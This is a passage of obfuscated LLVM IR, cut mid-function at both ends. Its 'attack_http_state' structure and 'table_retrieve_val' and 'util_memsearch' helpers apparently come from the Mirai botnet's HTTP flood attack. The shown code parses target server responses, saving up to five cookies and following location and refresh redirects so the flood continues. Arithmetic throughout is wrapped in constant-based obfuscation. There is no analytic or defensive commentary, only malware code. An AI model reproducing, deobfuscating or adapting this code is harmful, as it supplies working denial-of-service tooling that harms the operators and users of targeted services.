  %1404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1403, i32 0, i32 15
  %1405 = load i32, i32* %1404, align 4
  %1406 = icmp slt i32 %1405, 5
  br label %1407

; <label>:1407:                                   ; preds = %1402, %1393
  %1408 = phi i1 [ false, %1393 ], [ %1406, %1402 ]
  br i1 %1408, label %1409, label %1622

; <label>:1409:                                   ; preds = %1407
  %1410 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1411 = load i32, i32* %37, align 4
  %1412 = sext i32 %1411 to i64
  %1413 = getelementptr inbounds i8, i8* %1410, i64 %1412
  %1414 = load i32, i32* %12, align 4
  %1415 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1416 = call i32 @util_stristr(i8* %1413, i32 %1414, i8* %1415)
  store i32 %1416, i32* %47, align 4
  %1417 = load i32, i32* %37, align 4
  %1418 = load i32, i32* %47, align 4
  %1419 = add i32 %1417, -2127724481
  %1420 = add i32 %1419, %1418
  %1421 = sub i32 %1420, -2127724481
  %1422 = add nsw i32 %1417, %1418
  %1423 = sext i32 %1421 to i64
  %1424 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1423
  %1425 = load i8, i8* %1424, align 1
  %1426 = sext i8 %1425 to i32
  %1427 = icmp eq i32 %1426, 32
  br i1 %1427, label %1428, label %1434

; <label>:1428:                                   ; preds = %1409
  %1429 = load i32, i32* %47, align 4
  %1430 = sub i32 %1429, -835533320
  %1431 = add i32 %1430, 1
  %1432 = add i32 %1431, -835533320
  %1433 = add nsw i32 %1429, 1
  store i32 %1432, i32* %47, align 4
  br label %1434

; <label>:1434:                                   ; preds = %1428, %1409
  %1435 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1436 = load i32, i32* %37, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds i8, i8* %1435, i64 %1437
  %1439 = load i32, i32* %47, align 4
  %1440 = sext i32 %1439 to i64
  %1441 = getelementptr inbounds i8, i8* %1438, i64 %1440
  %1442 = load i32, i32* %12, align 4
  %1443 = load i32, i32* %37, align 4
  %1444 = sub i32 %1442, -748052814
  %1445 = sub i32 %1444, %1443
  %1446 = add i32 %1445, -748052814
  %1447 = sub nsw i32 %1442, %1443
  %1448 = load i32, i32* %47, align 4
  %1449 = sub i32 0, %1448
  %1450 = add i32 %1446, %1449
  %1451 = sub nsw i32 %1446, %1448
  %1452 = call i32 @util_memsearch(i8* %1441, i32 %1450, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1452, i32* %48, align 4
  %1453 = load i32, i32* %48, align 4
  %1454 = icmp ne i32 %1453, -1
  br i1 %1454, label %1455, label %1616

; <label>:1455:                                   ; preds = %1434
  %1456 = load i32, i32* %37, align 4
  %1457 = load i32, i32* %47, align 4
  %1458 = add i32 %1456, 340862774
  %1459 = add i32 %1458, %1457
  %1460 = sub i32 %1459, 340862774
  %1461 = add nsw i32 %1456, %1457
  %1462 = sext i32 %1460 to i64
  %1463 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1462
  store i8* %1463, i8** %49, align 8
  %1464 = load i32, i32* %48, align 4
  %1465 = icmp sge i32 %1464, 2
  br i1 %1465, label %1466, label %1472

; <label>:1466:                                   ; preds = %1455
  %1467 = load i32, i32* %48, align 4
  %1468 = sub i32 %1467, 837247325
  %1469 = sub i32 %1468, 2
  %1470 = add i32 %1469, 837247325
  %1471 = sub nsw i32 %1467, 2
  store i32 %1470, i32* %48, align 4
  br label %1472

; <label>:1472:                                   ; preds = %1466, %1455
  %1473 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1474 = load i32, i32* %37, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds i8, i8* %1473, i64 %1475
  %1477 = load i32, i32* %47, align 4
  %1478 = sext i32 %1477 to i64
  %1479 = getelementptr inbounds i8, i8* %1476, i64 %1478
  %1480 = load i32, i32* %12, align 4
  %1481 = load i32, i32* %37, align 4
  %1482 = add i32 %1480, 1078569199
  %1483 = sub i32 %1482, %1481
  %1484 = sub i32 %1483, 1078569199
  %1485 = sub nsw i32 %1480, %1481
  %1486 = load i32, i32* %47, align 4
  %1487 = sub i32 %1484, 600684394
  %1488 = sub i32 %1487, %1486
  %1489 = add i32 %1488, 600684394
  %1490 = sub nsw i32 %1484, %1486
  %1491 = call i32 @util_memsearch(i8* %1479, i32 %1489, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1492 = icmp sgt i32 %1491, 0
  br i1 %1492, label %1493, label %1517

; <label>:1493:                                   ; preds = %1472
  %1494 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1495 = load i32, i32* %37, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds i8, i8* %1494, i64 %1496
  %1498 = load i32, i32* %47, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds i8, i8* %1497, i64 %1499
  %1501 = load i32, i32* %12, align 4
  %1502 = load i32, i32* %37, align 4
  %1503 = add i32 %1501, 63950440
  %1504 = sub i32 %1503, %1502
  %1505 = sub i32 %1504, 63950440
  %1506 = sub nsw i32 %1501, %1502
  %1507 = load i32, i32* %47, align 4
  %1508 = add i32 %1505, 2068278635
  %1509 = sub i32 %1508, %1507
  %1510 = sub i32 %1509, 2068278635
  %1511 = sub nsw i32 %1505, %1507
  %1512 = call i32 @util_memsearch(i8* %1500, i32 %1510, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1513 = sub i32 %1512, -347591551
  %1514 = sub i32 %1513, 1
  %1515 = add i32 %1514, -347591551
  %1516 = sub nsw i32 %1512, 1
  store i32 %1515, i32* %48, align 4
  br label %1517

; <label>:1517:                                   ; preds = %1493, %1472
  %1518 = load i32, i32* %37, align 4
  %1519 = load i32, i32* %47, align 4
  %1520 = sub i32 %1518, -1854058046
  %1521 = add i32 %1520, %1519
  %1522 = add i32 %1521, -1854058046
  %1523 = add nsw i32 %1518, %1519
  %1524 = load i32, i32* %48, align 4
  %1525 = sub i32 0, %1522
  %1526 = sub i32 0, %1524
  %1527 = add i32 %1525, %1526
  %1528 = sub i32 0, %1527
  %1529 = add nsw i32 %1522, %1524
  %1530 = sext i32 %1528 to i64
  %1531 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1530
  store i8 0, i8* %1531, align 1
  store i32 0, i32* %10, align 4
  br label %1532

; <label>:1532:                                   ; preds = %1547, %1517
  %1533 = load i32, i32* %10, align 4
  %1534 = load i8*, i8** %49, align 8
  %1535 = call i32 @util_strlen(i8* %1534)
  %1536 = icmp slt i32 %1533, %1535
  br i1 %1536, label %1537, label %1553

; <label>:1537:                                   ; preds = %1532
  %1538 = load i8*, i8** %49, align 8
  %1539 = load i32, i32* %10, align 4
  %1540 = sext i32 %1539 to i64
  %1541 = getelementptr inbounds i8, i8* %1538, i64 %1540
  %1542 = load i8, i8* %1541, align 1
  %1543 = sext i8 %1542 to i32
  %1544 = icmp eq i32 %1543, 61
  br i1 %1544, label %1545, label %1546

; <label>:1545:                                   ; preds = %1537
  br label %1553

; <label>:1546:                                   ; preds = %1537
  br label %1547

; <label>:1547:                                   ; preds = %1546
  %1548 = load i32, i32* %10, align 4
  %1549 = add i32 %1548, -4618142
  %1550 = add i32 %1549, 1
  %1551 = sub i32 %1550, -4618142
  %1552 = add nsw i32 %1548, 1
  store i32 %1551, i32* %10, align 4
  br label %1532

; <label>:1553:                                   ; preds = %1545, %1532
  %1554 = load i8*, i8** %49, align 8
  %1555 = load i32, i32* %10, align 4
  %1556 = sext i32 %1555 to i64
  %1557 = getelementptr inbounds i8, i8* %1554, i64 %1556
  %1558 = load i8, i8* %1557, align 1
  %1559 = sext i8 %1558 to i32
  %1560 = icmp eq i32 %1559, 61
  br i1 %1560, label %1561, label %1615

; <label>:1561:                                   ; preds = %1553
  %1562 = load i32, i32* %10, align 4
  store i32 %1562, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1563

; <label>:1563:                                   ; preds = %1582, %1561
  %1564 = load i32, i32* %10, align 4
  %1565 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1566 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1565, i32 0, i32 15
  %1567 = load i32, i32* %1566, align 4
  %1568 = icmp slt i32 %1564, %1567
  br i1 %1568, label %1569, label %1588

; <label>:1569:                                   ; preds = %1563
  %1570 = load i8*, i8** %49, align 8
  %1571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1571, i32 0, i32 16
  %1573 = load i32, i32* %10, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1572, i64 0, i64 %1574
  %1576 = getelementptr inbounds [128 x i8], [128 x i8]* %1575, i32 0, i32 0
  %1577 = load i32, i32* %50, align 4
  %1578 = call signext i8 @util_strncmp(i8* %1570, i8* %1576, i32 %1577)
  %1579 = icmp ne i8 %1578, 0
  br i1 %1579, label %1580, label %1581

; <label>:1580:                                   ; preds = %1569
  store i32 1, i32* %51, align 4
  br label %1588

; <label>:1581:                                   ; preds = %1569
  br label %1582

; <label>:1582:                                   ; preds = %1581
  %1583 = load i32, i32* %10, align 4
  %1584 = sub i32 %1583, 1139277922
  %1585 = add i32 %1584, 1
  %1586 = add i32 %1585, 1139277922
  %1587 = add nsw i32 %1583, 1
  store i32 %1586, i32* %10, align 4
  br label %1563

; <label>:1588:                                   ; preds = %1580, %1563
  %1589 = load i32, i32* %51, align 4
  %1590 = icmp ne i32 %1589, 0
  br i1 %1590, label %1614, label %1591

; <label>:1591:                                   ; preds = %1588
  %1592 = load i8*, i8** %49, align 8
  %1593 = call i32 @util_strlen(i8* %1592)
  %1594 = icmp slt i32 %1593, 128
  br i1 %1594, label %1595, label %1613

; <label>:1595:                                   ; preds = %1591
  %1596 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1596, i32 0, i32 16
  %1598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1598, i32 0, i32 15
  %1600 = load i32, i32* %1599, align 4
  %1601 = sext i32 %1600 to i64
  %1602 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1597, i64 0, i64 %1601
  %1603 = getelementptr inbounds [128 x i8], [128 x i8]* %1602, i32 0, i32 0
  %1604 = load i8*, i8** %49, align 8
  %1605 = call i32 @util_strcpy(i8* %1603, i8* %1604)
  %1606 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1606, i32 0, i32 15
  %1608 = load i32, i32* %1607, align 4
  %1609 = add i32 %1608, 66810224
  %1610 = add i32 %1609, 1
  %1611 = sub i32 %1610, 66810224
  %1612 = add nsw i32 %1608, 1
  store i32 %1611, i32* %1607, align 4
  br label %1613

; <label>:1613:                                   ; preds = %1595, %1591
  br label %1614

; <label>:1614:                                   ; preds = %1613, %1588
  br label %1615

; <label>:1615:                                   ; preds = %1614, %1553
  br label %1616

; <label>:1616:                                   ; preds = %1615, %1434
  %1617 = load i32, i32* %47, align 4
  %1618 = load i32, i32* %37, align 4
  %1619 = sub i32 0, %1617
  %1620 = sub i32 %1618, %1619
  %1621 = add nsw i32 %1618, %1617
  store i32 %1620, i32* %37, align 4
  br label %1393

; <label>:1622:                                   ; preds = %1407
  %1623 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1624 = load i32, i32* %12, align 4
  %1625 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1626 = call i32 @util_stristr(i8* %1623, i32 %1624, i8* %1625)
  %1627 = icmp ne i32 %1626, -1
  br i1 %1627, label %1628, label %1850

; <label>:1628:                                   ; preds = %1622
  %1629 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1630 = load i32, i32* %12, align 4
  %1631 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1632 = call i32 @util_stristr(i8* %1629, i32 %1630, i8* %1631)
  store i32 %1632, i32* %52, align 4
  %1633 = load i32, i32* %52, align 4
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1634
  %1636 = load i8, i8* %1635, align 1
  %1637 = sext i8 %1636 to i32
  %1638 = icmp eq i32 %1637, 32
  br i1 %1638, label %1639, label %1645

; <label>:1639:                                   ; preds = %1628
  %1640 = load i32, i32* %52, align 4
  %1641 = sub i32 %1640, -367828512
  %1642 = add i32 %1641, 1
  %1643 = add i32 %1642, -367828512
  %1644 = add nsw i32 %1640, 1
  store i32 %1643, i32* %52, align 4
  br label %1645

; <label>:1645:                                   ; preds = %1639, %1628
  %1646 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1647 = load i32, i32* %52, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds i8, i8* %1646, i64 %1648
  %1650 = load i32, i32* %12, align 4
  %1651 = load i32, i32* %52, align 4
  %1652 = add i32 %1650, -999257272
  %1653 = sub i32 %1652, %1651
  %1654 = sub i32 %1653, -999257272
  %1655 = sub nsw i32 %1650, %1651
  %1656 = call i32 @util_memsearch(i8* %1649, i32 %1654, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1656, i32* %53, align 4
  %1657 = load i32, i32* %53, align 4
  %1658 = icmp ne i32 %1657, -1
  br i1 %1658, label %1659, label %1849

; <label>:1659:                                   ; preds = %1645
  %1660 = load i32, i32* %52, align 4
  %1661 = sext i32 %1660 to i64
  %1662 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1661
  store i8* %1662, i8** %54, align 8
  %1663 = load i32, i32* %53, align 4
  %1664 = icmp sge i32 %1663, 2
  br i1 %1664, label %1665, label %1671

; <label>:1665:                                   ; preds = %1659
  %1666 = load i32, i32* %53, align 4
  %1667 = sub i32 %1666, -2006708140
  %1668 = sub i32 %1667, 2
  %1669 = add i32 %1668, -2006708140
  %1670 = sub nsw i32 %1666, 2
  store i32 %1669, i32* %53, align 4
  br label %1671

; <label>:1671:                                   ; preds = %1665, %1659
  %1672 = load i32, i32* %52, align 4
  %1673 = load i32, i32* %53, align 4
  %1674 = sub i32 %1672, 1862381331
  %1675 = add i32 %1674, %1673
  %1676 = add i32 %1675, 1862381331
  %1677 = add nsw i32 %1672, %1673
  %1678 = sext i32 %1676 to i64
  %1679 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1678
  store i8 0, i8* %1679, align 1
  %1680 = load i32, i32* %53, align 4
  %1681 = sub i32 0, 1
  %1682 = sub i32 %1680, %1681
  %1683 = add nsw i32 %1680, 1
  store i32 %1682, i32* %53, align 4
  %1684 = load i8*, i8** %54, align 8
  %1685 = load i32, i32* %53, align 4
  %1686 = call i32 @util_memsearch(i8* %1684, i32 %1685, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1687 = icmp eq i32 %1686, 4
  br i1 %1687, label %1688, label %1798

; <label>:1688:                                   ; preds = %1671
  store i32 7, i32* %10, align 4
  %1689 = load i8*, i8** %54, align 8
  %1690 = getelementptr inbounds i8, i8* %1689, i64 4
  %1691 = load i8, i8* %1690, align 1
  %1692 = sext i8 %1691 to i32
  %1693 = icmp eq i32 %1692, 115
  br i1 %1693, label %1694, label %1701

; <label>:1694:                                   ; preds = %1688
  %1695 = load i32, i32* %10, align 4
  %1696 = sub i32 0, %1695
  %1697 = sub i32 0, 1
  %1698 = add i32 %1696, %1697
  %1699 = sub i32 0, %1698
  %1700 = add nsw i32 %1695, 1
  store i32 %1699, i32* %10, align 4
  br label %1701

; <label>:1701:                                   ; preds = %1694, %1688
  %1702 = load i8*, i8** %54, align 8
  %1703 = load i8*, i8** %54, align 8
  %1704 = load i32, i32* %10, align 4
  %1705 = sext i32 %1704 to i64
  %1706 = getelementptr inbounds i8, i8* %1703, i64 %1705
  %1707 = load i32, i32* %53, align 4
  %1708 = load i32, i32* %10, align 4
  %1709 = add i32 %1707, 2011403357
  %1710 = sub i32 %1709, %1708
  %1711 = sub i32 %1710, 2011403357
  %1712 = sub nsw i32 %1707, %1708
  %1713 = sext i32 %1711 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1702, i8* %1706, i64 %1713, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1714

; <label>:1714:                                   ; preds = %1735, %1701
  %1715 = load i8*, i8** %54, align 8
  %1716 = load i32, i32* %10, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds i8, i8* %1715, i64 %1717
  %1719 = load i8, i8* %1718, align 1
  %1720 = sext i8 %1719 to i32
  %1721 = icmp ne i32 %1720, 0
  br i1 %1721, label %1722, label %1741

; <label>:1722:                                   ; preds = %1714
  %1723 = load i8*, i8** %54, align 8
  %1724 = load i32, i32* %10, align 4
  %1725 = sext i32 %1724 to i64
  %1726 = getelementptr inbounds i8, i8* %1723, i64 %1725
  %1727 = load i8, i8* %1726, align 1
  %1728 = sext i8 %1727 to i32
  %1729 = icmp eq i32 %1728, 47
  br i1 %1729, label %1730, label %1735

; <label>:1730:                                   ; preds = %1722
  %1731 = load i8*, i8** %54, align 8
  %1732 = load i32, i32* %10, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds i8, i8* %1731, i64 %1733
  store i8 0, i8* %1734, align 1
  br label %1741

; <label>:1735:                                   ; preds = %1722
  %1736 = load i32, i32* %10, align 4
  %1737 = sub i32 %1736, 770240227
  %1738 = add i32 %1737, 1
  %1739 = add i32 %1738, 770240227
  %1740 = add nsw i32 %1736, 1
  store i32 %1739, i32* %10, align 4
  br label %1714

; <label>:1741:                                   ; preds = %1730, %1714
  %1742 = load i8*, i8** %54, align 8
  %1743 = call i32 @util_strlen(i8* %1742)
  %1744 = icmp sgt i32 %1743, 0
  br i1 %1744, label %1745, label %1755

; <label>:1745:                                   ; preds = %1741
  %1746 = load i8*, i8** %54, align 8
  %1747 = call i32 @util_strlen(i8* %1746)
  %1748 = icmp slt i32 %1747, 128
  br i1 %1748, label %1749, label %1755

; <label>:1749:                                   ; preds = %1745
  %1750 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1751 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1750, i32 0, i32 7
  %1752 = getelementptr inbounds [129 x i8], [129 x i8]* %1751, i32 0, i32 0
  %1753 = load i8*, i8** %54, align 8
  %1754 = call i32 @util_strcpy(i8* %1752, i8* %1753)
  br label %1755

; <label>:1755:                                   ; preds = %1749, %1745, %1741
  %1756 = load i8*, i8** %54, align 8
  %1757 = load i32, i32* %10, align 4
  %1758 = sub i32 0, %1757
  %1759 = sub i32 0, 1
  %1760 = add i32 %1758, %1759
  %1761 = sub i32 0, %1760
  %1762 = add nsw i32 %1757, 1
  %1763 = sext i32 %1761 to i64
  %1764 = getelementptr inbounds i8, i8* %1756, i64 %1763
  %1765 = call i32 @util_strlen(i8* %1764)
  %1766 = icmp slt i32 %1765, 256
  br i1 %1766, label %1767, label %1797

; <label>:1767:                                   ; preds = %1755
  %1768 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1769 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1768, i32 0, i32 6
  %1770 = getelementptr inbounds [257 x i8], [257 x i8]* %1769, i32 0, i32 0
  %1771 = getelementptr inbounds i8, i8* %1770, i64 1
  call void @util_zero(i8* %1771, i32 255)
  %1772 = load i8*, i8** %54, align 8
  %1773 = load i32, i32* %10, align 4
  %1774 = sub i32 %1773, -1392463180
  %1775 = add i32 %1774, 1
  %1776 = add i32 %1775, -1392463180
  %1777 = add nsw i32 %1773, 1
  %1778 = sext i32 %1776 to i64
  %1779 = getelementptr inbounds i8, i8* %1772, i64 %1778
  %1780 = call i32 @util_strlen(i8* %1779)
  %1781 = icmp sgt i32 %1780, 0
  br i1 %1781, label %1782, label %1796

; <label>:1782:                                   ; preds = %1767
  %1783 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1784 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1783, i32 0, i32 6
  %1785 = getelementptr inbounds [257 x i8], [257 x i8]* %1784, i32 0, i32 0
  %1786 = getelementptr inbounds i8, i8* %1785, i64 1
  %1787 = load i8*, i8** %54, align 8
  %1788 = load i32, i32* %10, align 4
  %1789 = sub i32 %1788, -1753298736
  %1790 = add i32 %1789, 1
  %1791 = add i32 %1790, -1753298736
  %1792 = add nsw i32 %1788, 1
  %1793 = sext i32 %1791 to i64
  %1794 = getelementptr inbounds i8, i8* %1787, i64 %1793
  %1795 = call i32 @util_strcpy(i8* %1786, i8* %1794)
  br label %1796

; <label>:1796:                                   ; preds = %1782, %1767
  br label %1797

; <label>:1797:                                   ; preds = %1796, %1755
  br label %1846

; <label>:1798:                                   ; preds = %1671
  %1799 = load i8*, i8** %54, align 8
  %1800 = getelementptr inbounds i8, i8* %1799, i64 0
  %1801 = load i8, i8* %1800, align 1
  %1802 = sext i8 %1801 to i32
  %1803 = icmp eq i32 %1802, 47
  br i1 %1803, label %1804, label %1845

; <label>:1804:                                   ; preds = %1798
  %1805 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1806 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1805, i32 0, i32 6
  %1807 = getelementptr inbounds [257 x i8], [257 x i8]* %1806, i32 0, i32 0
  %1808 = getelementptr inbounds i8, i8* %1807, i64 1
  call void @util_zero(i8* %1808, i32 255)
  %1809 = load i8*, i8** %54, align 8
  %1810 = load i32, i32* %10, align 4
  %1811 = sub i32 0, %1810
  %1812 = sub i32 0, 1
  %1813 = add i32 %1811, %1812
  %1814 = sub i32 0, %1813
  %1815 = add nsw i32 %1810, 1
  %1816 = sext i32 %1814 to i64
  %1817 = getelementptr inbounds i8, i8* %1809, i64 %1816
  %1818 = call i32 @util_strlen(i8* %1817)
  %1819 = icmp sgt i32 %1818, 0
  br i1 %1819, label %1820, label %1844

; <label>:1820:                                   ; preds = %1804
  %1821 = load i8*, i8** %54, align 8
  %1822 = load i32, i32* %10, align 4
  %1823 = add i32 %1822, 969359914
  %1824 = add i32 %1823, 1
  %1825 = sub i32 %1824, 969359914
  %1826 = add nsw i32 %1822, 1
  %1827 = sext i32 %1825 to i64
  %1828 = getelementptr inbounds i8, i8* %1821, i64 %1827
  %1829 = call i32 @util_strlen(i8* %1828)
  %1830 = icmp slt i32 %1829, 256
  br i1 %1830, label %1831, label %1844

; <label>:1831:                                   ; preds = %1820
  %1832 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1833 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1832, i32 0, i32 6
  %1834 = getelementptr inbounds [257 x i8], [257 x i8]* %1833, i32 0, i32 0
  %1835 = getelementptr inbounds i8, i8* %1834, i64 1
  %1836 = load i8*, i8** %54, align 8
  %1837 = load i32, i32* %10, align 4
  %1838 = sub i32 0, 1
  %1839 = sub i32 %1837, %1838
  %1840 = add nsw i32 %1837, 1
  %1841 = sext i32 %1839 to i64
  %1842 = getelementptr inbounds i8, i8* %1836, i64 %1841
  %1843 = call i32 @util_strcpy(i8* %1835, i8* %1842)
  br label %1844

; <label>:1844:                                   ; preds = %1831, %1820, %1804
  br label %1845

; <label>:1845:                                   ; preds = %1844, %1798
  br label %1846

; <label>:1846:                                   ; preds = %1845, %1797
  %1847 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1847, i32 0, i32 1
  store i8 1, i8* %1848, align 4
  br label %2775

; <label>:1849:                                   ; preds = %1645
  br label %1850

; <label>:1850:                                   ; preds = %1849, %1622
  %1851 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1852 = load i32, i32* %12, align 4
  %1853 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1854 = call i32 @util_stristr(i8* %1851, i32 %1852, i8* %1853)
  %1855 = icmp ne i32 %1854, -1
  br i1 %1855, label %1856, label %2250

; <label>:1856:                                   ; preds = %1850
  %1857 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1858 = load i32, i32* %12, align 4
  %1859 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1860 = call i32 @util_stristr(i8* %1857, i32 %1858, i8* %1859)
  store i32 %1860, i32* %55, align 4
  %1861 = load i32, i32* %55, align 4
  %1862 = sext i32 %1861 to i64
  %1863 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1862
  %1864 = load i8, i8* %1863, align 1
  %1865 = sext i8 %1864 to i32
  %1866 = icmp eq i32 %1865, 32
  br i1 %1866, label %1867, label %1874

; <label>:1867:                                   ; preds = %1856
  %1868 = load i32, i32* %55, align 4
  %1869 = sub i32 0, %1868
  %1870 = sub i32 0, 1
  %1871 = add i32 %1869, %1870
  %1872 = sub i32 0, %1871
  %1873 = add nsw i32 %1868, 1
  store i32 %1872, i32* %55, align 4
  br label %1874

; <label>:1874:                                   ; preds = %1867, %1856
  %1875 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1876 = load i32, i32* %55, align 4
  %1877 = sext i32 %1876 to i64
  %1878 = getelementptr inbounds i8, i8* %1875, i64 %1877
  %1879 = load i32, i32* %12, align 4
  %1880 = load i32, i32* %55, align 4
  %1881 = add i32 %1879, 1582993916
  %1882 = sub i32 %1881, %1880
  %1883 = sub i32 %1882, 1582993916
  %1884 = sub nsw i32 %1879, %1880
  %1885 = call i32 @util_memsearch(i8* %1878, i32 %1883, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1885, i32* %56, align 4
  %1886 = load i32, i32* %56, align 4
  %1887 = icmp ne i32 %1886, -1
  br i1 %1887, label %1888, label %2249

; <label>:1888:                                   ; preds = %1874
  %1889 = load i32, i32* %55, align 4
  %1890 = sext i32 %1889 to i64
  %1891 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1890
  store i8* %1891, i8** %57, align 8
  %1892 = load i32, i32* %56, align 4
  %1893 = icmp sge i32 %1892, 2
  br i1 %1893, label %1894, label %1899

; <label>:1894:                                   ; preds = %1888
  %1895 = load i32, i32* %56, align 4
  %1896 = sub i32 0, 2
  %1897 = add i32 %1895, %1896
  %1898 = sub nsw i32 %1895, 2
  store i32 %1897, i32* %56, align 4
  br label %1899

; <label>:1899:                                   ; preds = %1894, %1888
  %1900 = load i32, i32* %55, align 4
  %1901 = load i32, i32* %56, align 4
  %1902 = sub i32 0, %1901
  %1903 = sub i32 %1900, %1902
  %1904 = add nsw i32 %1900, %1901
  %1905 = sext i32 %1903 to i64
  %1906 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1905
  store i8 0, i8* %1906, align 1
  %1907 = load i32, i32* %56, align 4
  %1908 = sub i32 0, %1907
  %1909 = sub i32 0, 1
  %1910 = add i32 %1908, %1909
  %1911 = sub i32 0, %1910
  %1912 = add nsw i32 %1907, 1
  store i32 %1911, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1913

; <label>:1913:                                   ; preds = %1939, %1899
  %1914 = load i8*, i8** %57, align 8
  %1915 = load i32, i32* %10, align 4
  %1916 = sext i32 %1915 to i64
  %1917 = getelementptr inbounds i8, i8* %1914, i64 %1916
  %1918 = load i8, i8* %1917, align 1
  %1919 = sext i8 %1918 to i32
  %1920 = icmp ne i32 %1919, 0
  br i1 %1920, label %1921, label %1937

; <label>:1921:                                   ; preds = %1913
  %1922 = load i8*, i8** %57, align 8
  %1923 = load i32, i32* %10, align 4
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds i8, i8* %1922, i64 %1924
  %1926 = load i8, i8* %1925, align 1
  %1927 = sext i8 %1926 to i32
  %1928 = icmp sge i32 %1927, 48
  br i1 %1928, label %1929, label %1937

; <label>:1929:                                   ; preds = %1921
  %1930 = load i8*, i8** %57, align 8
  %1931 = load i32, i32* %10, align 4
  %1932 = sext i32 %1931 to i64
  %1933 = getelementptr inbounds i8, i8* %1930, i64 %1932
  %1934 = load i8, i8* %1933, align 1
  %1935 = sext i8 %1934 to i32
  %1936 = icmp sle i32 %1935, 57
  br label %1937

; <label>:1937:                                   ; preds = %1929, %1921, %1913
  %1938 = phi i1 [ false, %1921 ], [ false, %1913 ], [ %1936, %1929 ]
  br i1 %1938, label %1939, label %1946

; <label>:1939:                                   ; preds = %1937
  %1940 = load i32, i32* %10, align 4
  %1941 = sub i32 0, %1940
  %1942 = sub i32 0, 1
  %1943 = add i32 %1941, %1942
  %1944 = sub i32 0, %1943
  %1945 = add nsw i32 %1940, 1
  store i32 %1944, i32* %10, align 4
  br label %1913

; <label>:1946:                                   ; preds = %1937
  %1947 = load i8*, i8** %57, align 8
  %1948 = load i32, i32* %10, align 4
  %1949 = sext i32 %1948 to i64
  %1950 = getelementptr inbounds i8, i8* %1947, i64 %1949
